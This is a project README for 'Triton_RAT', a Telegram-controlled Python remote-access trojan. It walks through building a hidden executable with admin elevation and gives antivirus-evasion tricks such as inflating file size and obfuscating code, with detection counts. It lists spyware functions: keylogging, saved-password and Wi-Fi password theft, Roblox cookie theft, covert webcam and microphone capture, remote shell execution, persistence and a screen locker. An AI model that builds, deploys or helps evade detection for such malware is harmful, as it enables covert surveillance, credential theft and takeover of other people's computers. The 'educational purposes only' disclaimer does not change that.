# Triton_RAT
<div align="center" id="top">
  
</div>


<div align="center">
  <h1>Triton_Remote_Administration_Tool</h1>
<img src="https://i.ibb.co/hVTH6L5/TRITON.png" alt="TRITON" border="0">
  
  <h2 align="center">Hi 👋, I'm WhiteeRabbit</h2>
  
  
  <h3 align="center">I wrote RAT in python that works with telegram!</h3>


  <h3>The best rat that works with telegram!</h3>
This tool was created for educational purporses only!
I'm not responding for your action!
</div>





## :dart: About ##

**With this tool you can control with YOUR pc remotly using telegram**
That you need only hand (2 optional) , exe file that you will get from pyinstaller and telegram account

<p align="left"> <a href="https://twitter.com/" target="blank"><img src="https://img.shields.io/twitter/follow/?logo=twitter&style=for-the-badge" alt="" /></a> </p>

<p align="left">
</p>

<h3 align="left">Let's get started!:</h3>
<h3 align="left">Download python!</h3>
<p align="left"> <a href="https://www.python.org" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/> </a> </p>

<h1 align="left">Bot Password (when you entering /help or /start) : acd</h1>



## :checkered_flag: Starting ##

```bash
# Register account in telegram
# Create bot with botfather


# Download this project
# In the old version of Rat we used a site for obfuscation and installed pyinstaller with github repo
# But antiviruses now detect it worse than installin pyinstaller via pip
# and Virustotal will show less detection than obfuscation
# But I wouldn't be me if i didn't find an obfuscation method
# There are still decetions , but at least we make fewer of them.

$ Download pyinstaller 5.13.0 or older versions: pip install pyinstaller==5.13.0
# if you downloaded pyinstaller from pip like pip install pyinstaller
# Delete that 

# also i'm recomending you to install and upgrade setuptools and pip
$ pip install --upgrade setuptools pip
# if you don't do this, problems may arise

# Download requiremets.txt
$ pip install -r requirements.txt

# change bot api in python file to your own bot
$ bot = telebot.TeleBot('your api token')

# !MAIN STEP! obfuscation will help to deceive antiviruses
$ For obfuscation we will use my python program which you can find at the link: https://github.com/WhiteeRabbit/fake_file_resizer
$ https://github.com/WhiteeRabbit/fake_file_resizer
# We can increase the file size through this appalication so that antiviruses skip rat beacuse of size.
# For example if you write the size 620 mb , Antivirus Eset will skip that,and it will less detetct.
# Download fake_file_resizer, then run:
$ python fake_file_resizer.py
# Enter your exe, then enter output file name after that write output file size in mb(don't write mb).
# Without manipulations with fake_file_resizer (no obfuscated) it shows 11 detects in virustotal, but with my ip is shows only 4 detects
# Today this is the best method of obfuscation 
# If you want to obfuscate CODE that I'm recomending to you these 2 websites:
# First (6 detection):https://pyob.oxyry.com/ (use this after minifying the code ,because code's too long)
# Second (5 detection): https://python-minifier.com/
# These are the best method if you don't want to use fake_file_resizer
# Don't worry it detects by not popular antiviruses
# First, copy the full code of Triton_RAT_Release.py then paste it in second link
# After that, paste minified code in Triton_RAT_Release.py, then build it with pyinstaller⬇️

# After downloading pyinstaller run:
$ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py

# Some people says that you can decrease detections count with adding --key "testname" attribute when building it with pyinstaller
# But, it didn't worked for me...


# wait for building exe
# !BOT PASSWORD IS: acd

$ run exe and bot started! 


```
<h1 align="left">If you want to avoid scanning some antiviruses you can make that⬇️</h1>
More online scanners and antiviruses also most popular online antivirus scanner virustotal's max allowed file size is 650 MB.
Antiviruses, seeing the file size that it is large, will stupidly not check it! and you will be cool man.
<h3>I wrote a python app that will help you to change your file's size for ex: from 100 mb to 750 mb. </h3>
<h3>With help of this app you can make your file's size as you wanted!(it works on all systems)</h3>
<h3>Download app: https://github.com/WhiteeRabbit/fake_file_resizer/</h3>
<a href="https://ibb.co/qWKpdkM"><img src="https://i.ibb.co/VQRTt2W/25.png" alt="23" border="0" /></a>
<h4>Download here: https://github.com/WhiteeRabbit/fake_file_resizer/</h4>

## You can use:
    **🛠️ System Commands**
    - ⚙️ **/start** - Start the program
    - ⚙️ **/help** - Help with commands
    - 🔌 **/addstartup** - Add autostart
    - 📁 **/filepath** - Shows the script's full path
    - ⌨️ **/keylogger** - Start keylogger
    - ⛔ **/stopkeylogger** - Stop keylogger
    - 👟 **/run [filepath]** - Run file
    - 🧑🏻‍💻 **/users** - Show users on the PC
    - 🖥️ **/whoami** - Show the name of the PC
    - 📃 **/tasklist** - Show running tasks
    - 🧨 **/taskkill [task]** - Kill the entered task
    - 💤 **/sleep** - Put the PC to sleep
    - 🕚 **/shutdown** - Shutdown the PC
    - 🔄 **/restart** - Restart the PC
    - 💥 **/altf4** - ALT + F4 (google it to find what it means)
    - 💣 **/cmdbomb** - Opens 10 CMD windows
    - Ⓜ️ **/msg [type] [title] [text]** - Displays a messagebox
    */msg types(info; warning; error; question; default or 0)*
    ** for ex: /msg error testtitle testtext **
    
    ## **🔒 Security & Privacy**
    - 🔑 **/passwords** - Show saved passwords on the PC
    - 🍪 **/robloxcookie** - Show Roblox cookies
    - 🧱 **/wallpaper** - Change the desktop wallpaper
    - 🪦 **/disabletaskmgr** - Disable Task Manager
    - 📠 **/enabletaskmgr** - Enable Task Manager
    - ☢️ **/winblocker** - My own winlocker
    - ☣️ **/winblocker2** - If winblocker doesn't work
    
    ## **📱 Device Management**
    - 📷 **/screenshot** - Take a screenshot
    - 🎙️ **/mic [time in seconds]** - Record the PC's microphone
    - 📹 **/webscreen** - Get a screenshot from the camera
    - 🎦 **/webcam** - Get webcam video
    - 🎥 **/screenrecord** - Record the screen
    - 🚫 **/block** - Block user input (mouse and keyboard)
    - ✅ **/unblock** - Unblock user input (mouse and keyboard)
    - 🖱️ **/mousemesstart** - Start mouse messing
    - 🐁 **/mousemesstop** - Stop mouse messing
    - 🪤 **/mousekill** - Disable the mouse
    - 🐭 **/mousestop** - Enable the mouse
    - 🖱️ **/mousemove [x] [y]** - Enter x and y cordinates and mouse's pointer goes there
    - 🐁 **/mouseclick** - Make click with mouse
    - 🔊 **/fullvolume** - Set volume to full
    - 🔉 **/volumeplus** - Increase volume by 10
    - 🔇 **/volumeminus** - Decrease volume by 10
    - 🔄️ **/rotate** - Rotate monitor +90 degrees (for exmpl: entering 2 times rotates it 180 degrees)
    - 🪟 **/maximize** - Maximize active window
    - 🪟 **/minimize** - Minimize active window
    
    ## **🌐 Networking**
    - 🛜 **/wifilist** - Show saved Wi-Fi networks
    - 🔐 **/wifipass [accesspoint]** - Show the password of a saved Wi-Fi network
    - 🌐 **/chrome [website URL]** - Open a website in Chrome
    - 🌐 **/edge [website URL]** - Open a website in Edge
    - 🌐 **/firefox [website URL]** - Open a website in Firefox
    
    ## **🎶 Multimedia**
    - 💬👂🏻 **/textspech [your text]** - Speak the text aloud
    - 🎵 **/playsound [file path]** - Play a sound file (first upload the file using **/upload**)
    - 📁 **/download [file path]** - Download a file from the PC
    - 🗃️ **/upload** - Upload a file to the PC
    - 📋 **/clipboard** - Show clipboard content
    - 📇 **/changeclipboard [testcahnge]** - Change clipboard content
    
    ## **⚙️ Advanced Operations**
    - 🗡️ **/e [command]** - Execute shell commands (shortcut)
    - 🏹 **/ex [command]** - Execute shell commands with long responses
    - 🔫 **/execute** - Execute shell commands my alternative of netcat in linux (works commands such as cd ,cd.. and etc...)
    - *commands like cd ,cd .. and others work excellent in the /e ,  /ex and /execute commands.*
    - 📅 **/metadata [filepath]** - Displays the file's metadata information
    - ⌨️ **/keytype [key]** - Enter a text and that text will written with pc's keyboard
    - ⌨️ **/keypress [key]** - Press a specific key on the keyboard
    - ⌨️ **/keypresstwo [key1] [key2]** - Press two keys simultaneously
    - ⌨️ **/keypressthree [key1] [key2] [key3]** - Press three keys simultaneously
    - 🕶️ **/hide** - Hide your app
    - 👓 **/unhide** - Unhide your app
    
    ## **🖥️ System Information**
    - 🪪 **/info** - Show PC information (IP, location, country, city)
    - 📊 **/pcinfo** - Info about PC's OS, system, CPU, Windows version, BIOS, etc...
    - 💻 **/shortinfo** - Show's less but, mostly the necessary information about pc
    - 🛠️ **/apps** - Show installed apps on the PC
    - 🔋 **/batteryinfo** - Show info about battery 
    
    ## **EXAMPLES:**
    - 📖 **/examples** - Shows examples
    
    ## **📱🤳🏻My Socials:🌐📲**
    - 🔗 **/github** - [**My github**]



## Antivirus check (with help of fake_file_resizer)🙂 ##

![Снимок экрана (24)](https://github.com/user-attachments/assets/715a1384-30ae-43ea-bbb2-3d4b66cb8cee)
## Antivirus check (with help of second obfuscation(minifying) method (i wrote about that⬆️)) ##
![Снимок экрана (26)](https://github.com/user-attachments/assets/1e5020f4-207a-4125-81be-a98371923f02)

## Triton_Rat V2 update features: ##
- **New interface and desing**
- **Added more than 10 new functions(also keylogger,metadata ,pc info and etc...)**
- **Added: minimaze ,maximize ,rotate monitor ,metadata ,keylogger, block/unblock user input ,better information about pc (from bios to battery) and etc... ☺️**
- **Fixed bugs**





## :memo: License ##

This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE.md) file.

